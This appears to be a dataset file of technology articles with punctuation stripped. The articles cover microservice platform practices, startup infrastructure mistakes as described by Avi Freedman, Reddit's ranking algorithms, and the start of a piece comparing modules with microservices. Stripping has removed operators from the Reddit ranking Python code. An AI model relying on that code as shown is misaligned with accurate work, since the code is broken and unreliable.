time  Then  you can release the feature to the users when you re ready   Your service teams will need an interface to view and manage feature flags on the platform  The code to lookup the flags can be included in a shared library   Incremental feature releases  Feature flags make it possible to release features to sets of users in phases  Perhaps to 10  of your users at first or perhaps only to users in a specific region  The advantage here is that you ll have an opportunity to identify problems before they impact a large percentage of your users  It also enables quick rollback of the feature by turning off the flag   The flags should be short lived  Feature flags should exist only until the feature is successfully deployed  Long running flags are a bad idea  they make it harder to support the users  as they ll be experiencing different behaviors   harder to test the system  with many code paths  and harder to debug the system  A flag should be scheduled to be removed soon after the feature is fully deployed   Only wrap the flag around the entry point  The point of a feature flag is to decouple feature deployment from code deployment  For this  you just need to wrap the flag around the entry point to the feature  not all the code paths related to it  As an example  for a user interface visible feature  a flag could just hide the link button in the interface to get to the feature   Configuration Management  Deployment  A deployment package that s deployable anywhere shouldn t contain environment specific options or secrets  For that  we need a separate solution  The teams need the ability to manage the configuration and securely get them to the services on startup  Microservice platforms typically have built in solutions that can be leveraged for this   Popular approaches for delivering the configuration are   Environment variables   Load configuration into the environment variables of the service     Load configuration into the environment variables of the service  Filesystem volume   Mount a filesystem with the secrets and configuration into the service     Mount a filesystem with the secrets and configuration into the service  Shared key value store  Have the service talk to a shared key value store   If you re using environment variables  one thing to watch out for is that they tend to be leaky by default  Exception handlers will grab and ship the environment to a logging platform  Child processes also duplicate the parent s environment on startup  As a result  it s possible to accidentally leak secrets  You can work around this by scrubbing the environment after reading the variables  but that s just an extra step that could be missed   Operations  Centralized Logging  Operations  Each instance of a service will generate logs  With a system image for a deployment package  those instances will get replaced every time a new release is deployed  You can t really store any logs on those instances  they would just get lost on the next deployment   A centralized logging system should be provided to the service teams by the platform  All services should ship their logs to the same logging system in a standardized log format  This approach provides the service teams with the most flexibility   ability to search across all services  within a specific service  or within an instance of a service  All from the same place   The code that ships logs to the centralized logging system could be included in shared libraries or be provided as part of the service templates   But how do you track the impact of a request across multiple other services   There is where correlation IDs come in  Pass a correlation ID when communicating with any service and have the services include them into their log entries  Now  when you search across all services for the correlation ID  you re able to see the timeline of side effects from the original request across all services   Centralized Monitoring  Operations  When failures happen  tools that can help quickly understand the scope and source of the problem are invaluable  Centralized monitoring should be a core component of your platform  It provides your team with a much needed big picture and is especially helpful if you re experiencing cascading failures   For high availability  you will almost always be running more than one instance of a service behind a load balancer  Your monitoring solution should have the ability to aggregate metrics across instances  Additionally  you need to be able to quickly drilldown on those aggregated metrics to see their components in detail  All of this helps quickly assess if an identified failure is occurring service wide or is isolated to a specific instance of a service   What kind of metrics should be monitored   This can be broken down into a few different types   Infrastructure   Data you can gather at the OS level  Filesystem operations  filesystem latencies  network operations  memory usage  CPU usage     Data you can gather at the OS level  Filesystem operations  filesystem latencies  network operations  memory usage  CPU usage  General   Inbound requests to the service  Request count  request latency  error count  total and broken down per error code      Inbound requests to the service  Request count  request latency  error count  total and broken down per error code   Integrations   Downstream requests made by the service to other services  Request count  request latency  error count  total and broken down per error code      Downstream requests made by the service to other services  Request count  request latency  error count  total and broken down per error code   External Services   Communications with third party hosted services or other systems managed outside of the microservice platform     Communications with third party hosted services or other systems managed outside of the microservice platform  Service Specific  Any other metrics specific to the service   Everything except service specific metrics can be captured automatically by code in the service templates or shared libraries  With automatic capturing in place  you ll also be able to provide the service teams with a useful initial configuration for monitoring their services   Distributed tracing to connect the dots  Although monitoring solutions do a good job at identifying what s happening in and around a specific service  it s still hard to connect the dots across the services and understand the big picture   A distributed tracing system tracks requests as they break down into additional requests across your services  All this data is then visualized as a timeline  You get a ton of insight into how certain requests flow across your services and are able to quickly identify bottlenecks   Distributed tracing is to monitoring what correlation IDs are to logging  The two are similar enough that ID used to identify the request by the tracing system could also double as a correlation ID   Auto Scaling  Operations  Services that are stateless are inherently easy to scale  Just add more instances as needed behind your load balancer  The information needed to make a scaling decision  cpu memory usage  etc  can be retrieved from the monitoring platform   Many microservice platforms have declarative interfaces to handle instance count  which can be quite handy  You tell it how many instances you need  it makes it happen  All you really need to implement auto scaling on such a platform is a way to update the  required instance count  programmatically  As an added bonus  the same process also takes care of failing instances by adding a new one whenever an existing one fails   External Services  Operations  Your services will also need to talk to systems that are not created by your teams  Some examples are  databases  caches  message queues  email delivery systems  These systems can be made available to your teams as hosted services provided by a third party or custom services managed within your organization  Either way  given the large number of services and environments that may need their own instances of these systems  it s important to ensure you have automation around the provisioning and management of these systems   What about just wrapping them as services on the platform   It s definitely possible to provide a database system with persistent storage and integrate it into your logging and monitoring systems  However  this may not always be practical  Some systems have special infrastructure requirements  especially when considering high availability configurations  Some may not be in a position to be automatically restarted after a failure  You ll need to assess these on a case by case basis   What about having multiple services just share the systems   This works as long as you take care to ensure that each service isn t aware of another service s configuration or data  For example  multiple services could share a common data server  each with their own database  They have no knowledge of any other databases on the shared data server  When a particular service needs to scale faster than the others  it s database can be extracted into a dedicated data server   The caveat with this approach  however  is that shared resources can be harder to independently isolate and monitor  For example  in a shared data server  it may be possible for one service to use an excessive amount of resources and unknowingly impact the performance of other services  If monitoring weren t granular enough  it would also take time to identify the problematic service   People  Full Lifecycle Ownership  People  Service teams should own  operate and evolve the services they build  Their work is done when the service is retired  not when it s shipped   With this approach  those who feel the pain of poor architectural decisions are also able to fix them  The additional operational knowledge they gain is valuable input when deciding how to best evolve the service to meet future growth requirements  All of this encourages operational simplicity which ultimately results in improved stability of the services   Autonomous Full Stack Teams  People  When you re building a number of small services  each team member will be part owner of multiple services  It s important that the team that owns the service has the skills and tools necessary to develop  deploy and operate the service  They should be fully autonomous in their daily operations so they re able to react quickly to changing business requirements   Managing team turnover  People quit from time to time  When that happens  you need to ensure no service goes ownerless  Even a service that s been running without fuss for a long time needs someone responsible for it when things go wrong   People also move around within an organization  Consistency in development  deployment and operations practices across your microservices can minimize the learning curve when service ownership changes hands   How big should a team be   Communication gets harder as a team gets bigger  Teams should be big enough that they can get stuff done autonomously without wasting too much time in the processes that enable them to communicate  Amazon  for example  is famously known for their two pizza teams  Those are teams that can be fed with two pizzas   References  I ve done my best to learn from those who ve gone down the path of microservices before,"[1351 61 778 92 1347 673 300 952 1309 1403 1405]"
1373,training-dataset/business/1278.txt,business,The Three Infrastructure Mistakes Your Company Must Not MakeWhen Avi Freedman was getting ready to graduate Temple University in 1992  there was no way to buy internet service in Philadelphia  Literally  If you wanted to send someone money to get a dial up account  there was nobody to send it to  But Freedman had already been running public access Unix machines and letting people he knew log into them  So he decided to turn his personal frustration into a company that would offer dial up Internet access to everyone in the area   He thought   Well  it can t be that hard  I ll just buy a commercial 24 7 internet access link and add some modems   Not long afterward  Freedman founded Philadelphia s first ISP  That early experience has served him well  Netaxs and many similar ISPs that built out the commercial internet spawned a community of people that now run some of the largest enterprise  web  and cloud and service provider infrastructures around the world   Freedman has since wended his way through the networking world  He ran engineering for AboveNet  a global backbone provider  now part of Zayo   spent 10 years at Akamai  running the network group and creating infrastructure focused services  and then served as CTO for the hosting and cloud company ServerCentral  Two and a half years ago  he founded Kentik to give companies complete visibility into their network traffic  performance and security  Having seen over 100 startups scale their infrastructure  he s one of the best sources of advice we could have found to talk about technical infrastructure   In this exclusive article  Freedman shares the three biggest  often company ending  mistakes startups make when it comes to setting up their systems   They land themselves in Cloud Jail   They get sucked in by  hipster tools    They don t design for monitorability   But don t worry if you spot symptoms of these where you work  It s possible to avoid these pitfalls if you re aware of them as you build your company   WELCOME TO CLOUD JAIL   It s a story I see repeat itself over and over  A startup gets a  250 000 credit to set up their infrastructure on the cloud  It s awesome  It s beautiful  And it s only  20 000 a month to start   says Freedman   But then they grow  and it becomes  50 000   then  100 000 month  Suddenly  they re out of credit  It goes to  150 000   200 000  That s when their board swoops in saying   Wait wait wait  what happened  People are supposed to be your biggest cost and you re pouring it all into the cloud   So the startup scrambles  squishing and squeezing until they get down to  80 000 a month   optimizing their database as a service use  buying spot or reserved instances  tuning their instance types  tracking down and deleting unused object and block storage  After a while  they get to a hard packed  80 000  and still growing   leaving no room for further easy optimization    If they want to keep growing as fast as they and their board want  they ll be back up to and blowing past the high water mark in no time   and there s nothing they can do easily about it  It becomes hard to afford the infrastructure they need to stay in business   especially in 2016  with an increased focus on margin and unit economics   As an example  five years ago  a company doing video encoding and streaming came to Freedman with a  300 000 mo  and rising bill in their hand  which was driving negative margin   the faster they grew  the faster they d lose money  He helped them move 500TB and 10 gigabits sec of streaming from their public cloud provider to their own infrastructure  and in the process brought their bill to under  100 000 mo   including staff that knew how to handle their physical infrastructure and routers  Today  they spend  250 000 mo  for infrastructure and bandwidth and estimate that their Amazon bill would be well over  1 000 000 mo   What they said after the ordeal was key   Man  we wish we d spent the time upfront to run at least some infrastructure on our own so we weren t trapped   and had the ability to more easily migrate once we scaled   In modern terms  they would have preferred to run a  hybrid  of some cloud based infrastructure and their own servers   or at the very least a multi cloud system   Everyone wishes they could go back in time and tell themselves to use the cloud to grow  but not get tied to any one provider    Cloud Jail is waking up to discover you re spending way too much money on infrastructure and are completely beholden to your cloud provider   says Freedman   It s not easy to switch once this happens  You re using their specific services and environments  You re hooked on what they do for you  and it can be incredibly difficult and expensive to migrate    For example  Amazon  which he picks on simply because it s the industry leader  has a number of addictive attributes  It makes it easy to do things like user identity  Authentication  Queueing  Email  Notifications  Seamless databases  These are all lightweight services that can save you a lot of time  but only if you re using AWS  The magic  for Amazon  is that they deter people from migrating despite mounting costs for storage and bandwidth  Amazon customers just can t imagine living without the perks    Wake up  Your board is calling asking why your gross margin is never going above 40   and why you re spending more on infrastructure than on developers   he says   Things were supposed to scale logarithmically  you explain  The costs were supposed to go down as you grew   but that s not what s happening   Especially in today s VC market  these sorts of befuddled excuses won t cut it   For companies whose revenue is tied to bit delivery over the internet  it can become critical to run in a hybrid or multi cloud mode to be able to control and ensure outstanding customer experience  Modern network performance management tools can detect and pinpoint congestion that is causing degraded user performance  but cloud providers are often unwilling to investigate or fix remote  in the internet  problems with traffic delivery   This  even more than cost  has been a driver of tens of companies that Freedman has seen migrate the user facing parts of their systems  This trend is especially pronounced in the SaaS world  where Customer Success and user experience is a core driver of not just renewal and retention  but also of revenue growth   So  what should you do instead    You want to go into infrastructure with your eyes open  knowing that cloud isn t always cheaper or more performant   says Freedman   Just like you have  or should have  a disaster recovery plan or a security contingency plan   know what you ll do if and when you get to a scale where you can t run everything in the cloud for cost or performance reasons  Know how you might run at least some of your own infrastructure  and hire early team members who have some familiarity and experience with the options for doing so    By this  he doesn t mean buying a building and installing chillers and racks  He means leasing colocation space in existing facilities run by someone else  and buying or leasing servers and routers  That s still going to be more cost effective at scale for the non bursting and especially  monotonically increasing  workloads that are found in many startup infrastructures   The earlier you start to think about this the better  If you can get away with it  start out running multi cloud and post initial traction  set up a small infrastructure  cross connected to your cloud provider s    Freedman practices what he preaches  His 2 5 year old company Kentik  for instance  never did put production workload on the public cloud  Running in Equinix facilities  managing petabytes of storage  and analyzing traffic flows for 100 companies  their bandwidth and colocation bill and equipment depreciation costs are both about  20 000 a month  As a 2 5 year old data analytics company  their gross margin is over 50  and growing   including operations staff   because they decided to skip the public cloud altogether for production workloads    When you decide to run your own starter infrastructure  you spend under  10 000 for the space  power and bandwidth every month   he says   Sure  you may have started with  50 000 then grown to  300 500 000 of one time equipment purchases  But this is actually still so low relative to cloud compute  storage  and bandwidth that you can afford staff to manage your infrastructure fairly early nowadays    It s also much easier to run the actual servers in dedicated infrastructures  While it was exotic 10 years ago  most operations teams now  treat servers as cattle  not pets   and can flexibly deploy applications using configuration management systems like Chef  Puppet  Salt  or Ansible  or via containerization and container orchestration systems   Staff makes a difference  Just three to five people hired early on can run both cloud and dedicated infrastructure  and that same team can often run a system 10x as large as when they started  It facilitates scale in a huge way   Hire a colonel as soon as you can    an infrastructure colonel who has serious history running hybrid   at least some cloud and some physical infrastructure  That way  as your costs grow  someone smart is watching  and they ll know when to pull the trigger to make changes in the right direction  On the list of things worth your early investment  this is at the top    One last tip about public  virtualization based  cloud migration   For always on and especially storage heavy workloads  consider  bare metal  cloud and dedicated server providers like SoftLayer  LeaseWeb  OVH  Packet  and others   Freedman says   Especially if you re cash constrained or don t need or want to run your own networking for control or performance    How can you tell you might be headed for Cloud Jail   Freedman advises startups to watch the following indicators as a measure of whether they may be approaching the danger zone   Tally up the portion of your bill that relates to  always on  and  steady state  or constantly growing workloads  When these items cross the  100 000 mo  mark  you may hit the tipping point sooner than you expect   Watch how many infrastructure services you buy from your cloud provider s  beyond basic compute  network  and storage  Specifically things like authentication  load balancing  SQL and NoSQL services  Do you have alternate options for them  Will the services you are buying now work well over a direct connection to your own infrastructure if and when the time comes   Monitor for network performance issues that your current provider s  can t or won t work around  such as packet loss and poor throughput to certain geographies or internet providers  If you can t resolve these issues by using CDNs and SD WAN acceleration services  that s a red flag  For many SaaS and web companies  performance becomes the key driver to running either multi cloud or at least some dedicated infrastructures to which they can load balance for performance   What if you re already trapped in Cloud Jail   The solution comes back to staff  If you haven t already  be prepared to hire a couple  infrastructure operations  folks who know the playbook   they ve run infrastructure before  They ll call Equinix  CyrusOne  Switch  or similar providers  get colocation cabinets or cages  provision bandwidth  and select  order  and install servers  Starting from scratch  this can be a 6 to 12 month process   especially if there are petabytes of data to move or a company with a lot of fast growing revenue   But Freedman has also seen it get done in 2 to 3 months  albeit with the aid of a good amount of  exigent engineering   Or  if your footprint is smaller or need for control lower  perhaps they ll skip the private network colocation and just start by adding some dedicated servers or  bare metal cloud  into the mix   Freedman has personally seen 30 web companies go through this type of transition  and most of them have 3 to 5 core people running the network and physical server administration  The great news is that as long as you have the runway  it s possible to dig out when public cloud fees start eating you alive   And if you re spending a lot  aren t sure you can get to great gross margins with current cloud usage  but can t recruit infrastructure nerds on staff  don t despair   The networking community is very open and people are usually happy to socialize and help   says Freedman   Go to NANOG  RIPE  APRICOT  or your local network nerding meetup or conference  Make connections and ask questions  and you can usually find people who can help you analyze and plan your infrastructure    The Takeaway  Importantly  Freedman is not saying startups shouldn t use the cloud initially   especially with the credits available when you re venture backed   The cloud can be a great  capital efficient way to start a business and to handle bursty workloads  You just have to know where the breaking points are   When you ve packed your steady state workloads  your cloud bill is in the hundreds of thousands per month and growing regularly by tens of thousands  it can already be too late  You need to have switched more over to your own infrastructure before that milestone    People lose track because they don t care when it s just  1 or 2 million year less efficient  But it can sneak up on you and become an existential threat to your whole company  driving whether you make money or get more funding  or bite the dust  That s when people have wished they had thought more about it earlier    FALLING FOR HIPSTER TOOLS   People are suckers for new tools  They hear that an  impressive  web company has developed a technical infrastructure tool to solve a particular problem  and they just have to try it because it sounds convenient and time saving and hip   says Freedman   We ve fallen for this at Kentik  We saw something that solved specific distributed systems problems and said   Ooh  that looks good   we ve always wanted something like that   Luckily  it only cost us a lot of of time and internal suffering  but didn t cause outages that were visible to users   Other companies haven t been so lucky   Even the smartest people in the world get bored using the same stuff again and again  They always want new tools that solve problems at scale    If you decide to use the  new hotness  that you see blowing up on Hacker News  remember this  It was probably shown off in its best possible light  in a situation that was exactly right for it  So only expect it to work if you give it the exact same kind of input  expect the exact same kind of output  and use it in the exact same kind of application   says Freedman   If anything deviates from its one awesome use case   which is obviously the way its makers used it   it s probably going to break    A year or so ago  Kentik started using a system developed for service discovery for monitoring  But it was never actually designed for the scale they started using it at  Their operations team wound up spending 5 to 10 hours a week of a year wasting time when the system   designed to glue infrastructure together   started causing micro outages  Eventually they migrated away from it  He s seen a number of companies go through for emergency migrations when tools and components result in even worse outages   If you discovered the tool on Hacker News and it s less than 18 months old    Danger  Will Robinson    Freedman s one  overarching piece of advice on the matter  When it comes to infrastructure components  keep it as simple as possible   And have a healthy amount of skepticism    When it comes to your infrastructure  especially the core components that glue everything together   storage  load balancing  service discovery   you really need to be using things that are not  themselves  going to cause problems  You probably have enough problems with the rest of your application and components    So  what should you do instead   As an executive  if you see your team tempted by a hipster tool  you need to call for a time out and ask   Exactly how big is the problem we re trying to solve   You can use these questions to gauge how you feel about it   How big of a trade off are you willing to make   How big of a risk are you willing to take  Can you lose money  Time  Customers   Are you going to have to contribute to the development of the component or tool  Can you afford a part time worker or more to develop a component into something workable at a different scale   How mature is this component  and is it actively in use for the type of application that you re running   What proof do you have that the tool is stable in a variety of situations   How much time and effort might the tool save if it works perfectly   Is this a tool or component you ll eventually have to write ourselves because other current options are so painful   Can you find people who have documented failure modes  Especially if not  do you have time to invest to figure those out  and the fragilities and recovery paths  on your own   Almost always  this gauntlet will dissuade you from using a new tool  There are  however  three conditions  ideally combined  that might justify the use of an experimental component   You use understood  tested  and reliable components for every other aspect of your infrastructure   You need to solve a problem that will put you out of business because of cost or availability   I e  you need the rapid scale or economics the component might give you in order to survive    You have a problem you can t solve that is core to your customer or user experience   in which case  becoming part of the development community for an emerging tool may be cheaper than building from scratch   In the last two cases  the more expensive choice is not to experiment with tools  But short of a hail mary pass  it s often a mistake   The best operators won t use a component until they know how it breaks    Every component has bugs   says Freedman   Unless you have experience with it  especially if it s in active development and some of those developers are not in house to you  you re working without a safety net    One of the best defenses is reminding yourself how high the stakes are    I ve seen a number of companies have 3 day outages because of multiple instabilities in layers of infrastructure that were supposed to glue everything else together   says Freedman   Sure  it might be fixable  but when your world is on fire as a result  it s beyond painful  The common response is to rip the offending component out  and that comes with it s own consequences  He s seen startups   especially those using untested storage systems   lose critical infrastructure metadata  and worse  customer data  That s a breach of trust most can t bounce back from  And  he advises  be extra cautious about storage components    If you re a founder at an early startup  call a huddle of your leadership  Check religion and fun at the door when it comes to tooling  and make a vow to check and balance each other s decisions about what components to use   Ask each other the questions above and don t compromise   When your company s a bit larger  it s also helpful to create an  architecture review board    essentially  a group of smart  informed people who will approve the use of new components  This is something Akamai excelled at    I was on both sides of the  arch board    submitting a design for review  and for a time representing network architecture  The board functions like a good lawyer does for a CEO   says Freedman   They asked for all the details and gave me their judgment  calling out risks and pointing out options and precedent  It helped everyone avoid some bad decisions  At the very least  this kind of process forces explicit discussions around not only system and component architecture  but also around adopting new outside tools and components    Freedman at Kentik HQ   DESIGN FOR MONITORABILITY  It s become a modern mantra to do  test first development   And there are a lot of good reasons for that  If you don t understand something well enough to test it  you probably shouldn t be writing that code  But Freedman argues a slightly different thesis    Instead of thinking first only about your ability to test  you also and critically need to think about your ability to monitor   he says   If you don t know how the component is going to run in combination with the rest of your infrastructure  or how to put in the instrumentation you need  it s probably dangerous to be putting that component in place    Testing usually refers to unit testing  which focuses on components in isolation  But many times when things go south  it s the unintended consequence of how things interact in dynamic systems   not how things behave on their own   You have to think through all possible interactions  and what instrumentation  giving you visibility into those interactions  will look like in advance of building  Especially in distributed systems  where often the problem shows up far from the actual root cause that triggered a  ripple  effect  causing the symptoms that you re seeing   When things go sideways with complex systems  it s often because a component gives a delayed answer  or a slightly incorrect answer  setting up cascading issues so that a user facing performance problem pops up at a different place than its root cause  This is the kind of thing proper instrumentation can pin down fast   Freedman has seen sophisticated instrumentation work at startups as well as at massive scale  At Akamai  developers were first encouraged  and then forced  to write code in every infrastructure component that they  and infrastructure managers  could then query at any time to see what was going on  This worked well enough that developers rarely needed to log into machines for debugging  which could have caused security  performance and scale issues  The key  though  is being proactive about this instrumentation   especially at the interfaces between components  Going back retroactively takes much longer    The rigor that it takes to think about how a component is going to work in a distributed system is really healthy   says Freedman   Building in proactive or reactive instrumentation can help leap frog the unit test limitations of believing that a component works because you tested the input you were expected to give it and got the output you expected to get    The idea of monitoring is not revolutionary  But most people don t consider monitor ability when they re designing    Before Kentik  I was running readnews  a Usenet company with a system running in 4 locations around the world with 8 different software components that people were using 24 7   says Freedman   Eventually we instrumented the components to report in nauseating detail how they were doing and how the components they were providing to   and got service from   were doing  Before that  it would take days on average to debug a performance problem  and often there were issues we simply didn t have the data to debug    Readnews added two specific types of instrumentation to all of its components   Tracing of the user  and a unique transaction ID  for every piece of work done in the system  and embedding those elements in log data   Adding the network performance data to every transaction  both internal and internet facing    The best case scenario is to have every component streaming their detailed logs to you  and to set up a separate system to correlate them   At the usenet company  once we embedded user and transaction identity  and exported correlated network performance data  that s when we started to get alerts that were actionable  because we started to catch things the instant they became inconsistent   he says   When we did this  the amount of time it took us to run our infrastructure went from 20 hours a week of diagnostics and debugging to a couple hours a week of restarting a component  noting a bug  fixing it  and moving on  It also allowed us to spend time proactively resolving internet performance problems  and we shared detailed logs and our analytics portal with some of our largest wholesale customers so they could handle support issues without our assistance    As it s becoming more common to break infrastructure into  microservices   this kind of instrumentation and distributed tracing becomes critical  Especially for companies that collect all of their revenue over the internet  being able to quickly pinpoint whether issues are caused by systems  applications  or local  cloud  or internet networks is key   Just exporting these additional logs and metrics isn t sufficient  however   operators need tools that can process and make sense of them to track performance by user  application  and network component    APM  Application Performance Monitoring  tools are not sufficient to quickly pinpoint these problems   says Freedman   They often don t understand the custom components people use  or have visibility into the right internal metrics    That said  metrics and log processing systems often see only a piece of the puzzle  and today s network visibility systems don t do deep dives into application internals  To get a complete picture often requires a synthesis of modern APM  network  metrics  and log processing systems that can interoperate via open APIs  he says   One key emerging type of tool Freedman advises looking into implementing is a  distributed tracing  system  often modeled after Google s  Dapper  system  These systems often provide glue to assist preserving the user data and a transaction ID with every bit of work that gets done  and provide correlation and reporting to allow both tracing transactions details  and seeing aggregate trends   But  Freedman says  even without formal distributed tracing tools  just emitting the right instrumentation in metrics and logs is a great first step and provides the  food  your systems will need to be able to correlate application  network  and system metrics to actual user experience with performance and stability   While instrumentation could lead you toward using new or  hipster tools   this does not present as big of an availability risk as those tools highlighted above that essentially glue your system together   Yes  distributed tracing frameworks are a bit of a new hotness but it s a pretty safe thing to experiment with  The main caveat is that you need to make sure you provision your monitoring infrastructure to not melt under the added load   Another trick that can work well is to do  sampled  tracing  where you only emit  or store  data for one in 1 000 or so transaction IDs  and dynamically enable un sampled tracing for users you re actively debugging   IN SUMMARY  Infrastructure can be a silent killer  One day you re running a company to deliver something special and new to customers   completely unrelated to the underlying technology making it possible   and the next  you re stymied by bills or bugs  Not to mention  plagued by performance problems  How disappointing to get taken down by something so foundational when your company is taking off  Yet it happens all the time   The three mistakes Freedman highlights here are by no means the only ones he s seen in his storied career  They just happen to be the most common and costly  Fortunately  the lessons they teach can help you avoid any number of other architecture related problems   Think about it early  So early you think it s way too early   At the same time  just because Google does it that way doesn t mean it s right for you   Establish a system of checks and balances  Enlist experts who can tell you when to say when   Predict the future to the best of your ability and iterate on it as you grow   Play conservatively  Don t bow to trends  Take your time  Get all the data you can   First do no harm  Protect your user experience at all costs  Make their trust sacred   With this advice  you can control a major piece of your company s destiny  And the more control you have  the more you can focus on the real problems you set out to solve,"[1373 935 778 1336 1351 92 673 61 251 1403 830]"
1374,training-dataset/engineering/636.txt,engineering,How Reddit ranking algorithms work   Hacking and Gonzo   MediumHow Reddit ranking algorithms work  This is a follow up post to How Hacker News ranking algorithm works  This time around I will examine how Reddit s story and comment rankings work   The first part of this post will focus on how are Reddit stories ranked  The second part of this post will focus on comment ranking  which does not use the same ranking as stories  unlike Hacker News   Reddit s comment ranking algorithm is quite interesting and the idea guy behind it is Randall Munroe  the author of xkcd    Digging into the story ranking code  Reddit is open sourced and the code is freely available  Reddit is implemented in Python and their code is located here  Their sorting algorithms are implemented in Pyrex  which is a language to write Python C extensions  They have used Pyrex for speed reasons  I have rewritten their Pyrex implementation into pure Python since it s easier to read   The default story algorithm called the hot ranking is implemented like this     Rewritten code from  r2 r2 lib db _sorts pyx    from datetime import datetime  timedelta  from math import log    epoch   datetime 1970  1  1     def epoch_seconds date    td   date   epoch  return td days   86400   td seconds    float td microseconds    1000000     def score ups  downs    return ups   downs    def hot ups  downs  date    s   score ups  downs   order   log max abs s   1   10   sign   1 if s   0 else  1 if s   0 else 0  seconds   epoch_seconds date    1134028003  return round sign   order   seconds   45000  7   In mathematical notation the hot algorithm looks like this   Effects of submission time  Following things can be said about submission time related to story ranking   Submission time has a big impact on the ranking and the algorithm will rank newer stories higher than older  The score won t decrease as time goes by  but newer stories will get a higher score than older  This is a different approach than the Hacker News s algorithm which decreases the score as time goes by  Here is a visualization of the score for a story that has same amount of up and downvotes  but different submission time   The logarithm scale  Reddit s hot ranking uses the logarithm function to weight the first votes higher than the rest  Generally this applies   The first 10 upvotes have the same weight as the next 100 upvotes which have the same weight as the next 1000 etc   Here is a visualization   Without using the logarithm scale the score would look like this   Effects of downvotes  Reddit is one of the few sites that has downvotes  As you can read in the code a story s  score  is defined to be   The meaning of this can be visualized like this   This has a big impact for stories that get a lot of upvotes and downvotes  e g  controversial stories  as they will get a lower ranking than stories that just get upvotes  This could explain why kittens  and other non controversial stories  rank so high     Conclusion of Reddit s story ranking  Submission time is a very important parameter  generally newer stories will rank higher than older  The first 10 upvotes count as high as the next 100  E g  a story that has 10 upvotes and a story that has 50 upvotes will have a similar ranking  Controversial stories that get similar amounts of upvotes and downvotes will get a low ranking compared to stories that mainly get upvotes  How Reddit s comment ranking works  Randall Munroe of xkcd is the idea guy behind Reddit s best ranking  He has written a great blog post about it   You should read his blog post as it explains the algorithm in a very understandable way  The outline of his blog post is following   Using the hot algorithm for comments isn t that smart since it seems to be heavily biased toward comments posted early  In a comment system you want to rank the best comments highest regardless of their submission time  A solution for this has been found in 1927 by Edwin B  Wilson and it s called  Wilson score interval   Wilson s score interval can be made into  the confidence sort   The confidence sort treats the vote count as a statistical sampling of a hypothetical full vote by everyone   like in an opinion poll  How Not To Sort By Average Rating outlines the confidence ranking in higher detail  definitely recommended reading   Digging into the comment ranking code  The confidence sort algorithm is implemented in _sorts pyx  I have rewritten their Pyrex implementation into pure Python  do also note that I have removed their caching optimization    The confidence sort uses Wilson score interval and the mathematical notation looks like this   In the above formula the parameters are defined in a following way   p is the observed fraction of positive ratings  n is the total number of ratings  z  2 is the  1   2  quantile of the standard normal distribution  Let s summarize the above in a following manner   The confidence sort treats the vote count as a statistical sampling of a hypothetical full vote by everyone  The confidence sort gives a comment a provisional ranking that it is 85  sure it will get to  The more votes  the closer the 85  confidence score gets to the actual score  Wilson s interval has good properties for a small number of trials and or an extreme probability  Randall has a great example of how the confidence sort ranks comments in his blog post   If a comment has one upvote and zero downvotes  it has a 100  upvote rate  but since there s not very much data  the system will keep it near the bottom  But if it has 10 upvotes and only 1 downvote  the system might have enough confidence to place it above something with 40 upvotes and 20 downvotes   figuring that by the time it s also gotten 40 upvotes  it s almost certain it will have fewer than 20 downvotes  And the best part is that if it s wrong  which it is 15  of the time   it will quickly get more data  since the comment with less data is near the top   Effects of submission time  there are none   The great thing about the confidence sort is that submission time is irrelevant  much unlike the hot sort or Hacker News s ranking algorithm   Comments are ranked by confidence and by data sampling     i e  the more votes a comment gets the more accurate its score will become   Visualization  Let s visualize the confidence sort and see how it ranks comments  We can use Randall s example   As you can see the confidence sort does not care about how many votes a comment have received  but about how many upvotes it has compared to the total number of votes and to the sampling size   Application outside of ranking  Like Evan Miller notes Wilson s score interval has applications outside of ranking  He lists 3 examples   Detect spam abuse  What percentage of people who see this item will mark it as spam   Create a  best of  list  What percentage of people who see this item will mark it as  best of    Create a  Most emailed  list  What percentage of people who see this page will click  Email    To use it you only need two things   the total number of ratings samplings  the positive number of ratings samplings  Given how powerful and simple this is  it s amazing that most sites today use the naive ways to rank their content  This includes billion dollar companies like Amazon com  which define Average rating    Positive ratings     Total ratings    Conclusion  I hope you have found this useful and leave comments if you have any questions or remarks   Happy hacking as always,"[686 1374 293 980 915 99 681 778 806 61 673]"
1377,training-dataset/engineering/980.txt,engineering,Modules vs  microservicesContainer  source  Antranias     Register for the O Reilly Software Architecture Conference in New York  April 2 5  to learn more about modules and microservices   Much has been said about moving from monoliths to microservices  Besides rolling off the tongue nicely  it also seems like a no brainer to chop up a monolith into microservices  But is this approach really the best choice for your organization  It s true that there are many drawbacks to maintaining a messy monolithic application  But there is a compelling alternative which is often overlooked  modular application development  In this article  we ll explore what this alternative entails and show how it relates to building microservices   Microservices for modularity   With microservices we can finally have teams work independently   or  our monolith is too complex  which slows us down   These expressions are just a few of the many reasons that lead development teams down the path of microservices  Another one is the need for scalability and resilience  What developers collectively seem to be yearning for is a modular approach to system design and development  Modularity in software development can be boiled down into three guiding principles   Strong encapsulation   hide implementation details inside components  leading to low coupling between different parts  Teams can work in isolation on decoupled parts of the system     hide implementation details inside components  leading to low coupling between different parts  Teams can work in isolation on decoupled parts of the system  Well defined interfaces   you can t hide everything  or else your system won t do anything meaningful   so well defined and stable APIs between components are a must  A component can be replaced by any implementation that conforms to the interface specification     you can t hide everything  or else your system won t do anything meaningful   so well defined and stable APIs between components are a must  A component can be replaced by any implementation that conforms to the interface specification  Explicit dependencies  having a modular system means distinct components must work together  You d better have a good way of expressing  and verifying  their relationships   Many of these principles can be realized with microservices  A microservice can be implemented in any way  as long as it exposes a well defined interface  oftentimes a REST API  for other services  Its implementation details are internal to the service  and can change without system wide impact or coordination  Dependencies between microservices are typically not quite explicit at development time  leading to possible service orchestration failures at run time  Let s just say this last modularity principle could use some love in most microservice architectures   So  microservices realize important modularity principles  leading to tangible benefits   Teams can work and scale independently   Microservices are small and focused  reducing complexity   Services can be internally changed or replaced without global impact   What s not to like  Well  along the way you ve gone from a single  albeit slightly obese  application to a distributed system of microservices  This brings an enormous amount of operational complexity to the table  Suddenly  you need to continuously deploy many different  possibly containerized  services  New concerns arise  service discovery  distributed logging  tracing and so on  You are now even more prone to the fallacies of distributed computing  Versioning of interfaces and configuration management become a major concern  The list goes on and on   It turns out there is as much complexity in the connections between microservices as there is in the combined business logic of all individual microservices  And to get here  you can t just take your monolith and chop it up  Whereas  spaghetti code  in monolithic codebases is problematic  putting a network boundary in between escalates these entanglement issues to downright painful   The modular alternative  Does this mean we are either relegated to the messy monolith  or must drown in the complexity of microservice madness  Modularity can be achieved by other means as well  What s essential is that we can effectively draw and enforce boundaries during development  But we can achieve this by creating a well structured monolith as well  Of course  that means 